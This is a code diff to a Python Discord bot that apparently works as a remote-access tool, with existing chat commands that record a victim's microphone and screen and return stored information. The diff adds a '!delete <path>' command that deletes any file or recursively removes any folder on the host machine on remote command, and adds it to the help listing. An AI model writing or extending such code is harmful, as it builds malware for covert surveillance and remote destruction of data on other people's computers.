@@ -22,6 +22,7 @@ from scipy.io.wavfile import write
 import warnings
 import psutil
 import uuid
+import shutil
 init()
 
 warnings.filterwarnings("ignore", category=UserWarning)
@@ -902,6 +903,27 @@ async def mic(ctx, seconds: int):
     except Exception as e:
         await ctx.send(f"Error recording: {e}")
 
+@bot.command()
+async def delete(ctx, *, path: str):
+    try:
+        full_path = os.path.abspath(path)
+
+        if not os.path.exists(full_path):
+            await ctx.send(f"❌ Path does not exist: `{full_path}`")
+            return
+
+        if os.path.isfile(full_path):
+            os.remove(full_path)
+            await ctx.send(f"🗑️ Deleted file: `{full_path}`")
+        elif os.path.isdir(full_path):
+            shutil.rmtree(full_path)
+            await ctx.send(f"🗑️ Deleted folder: `{full_path}`")
+        else:
+            await ctx.send(f"⚠️ Unknown file type: `{full_path}`")
+
+    except Exception as e:
+        await ctx.send(f"❌ Error: {e}")
+
 @bot.command(name="help")
 async def help_command(ctx):
     help_text = """
@@ -921,6 +943,7 @@ async def help_command(ctx):
 `!info` — Stored Helpful Info
 `!live <on/off>` — Record Screen
 `!mic <time> [max 30s]` — Record Microphone
+`!delete <path>` — Deletes File At Path
 
 `!help` — Shows this help message
 """
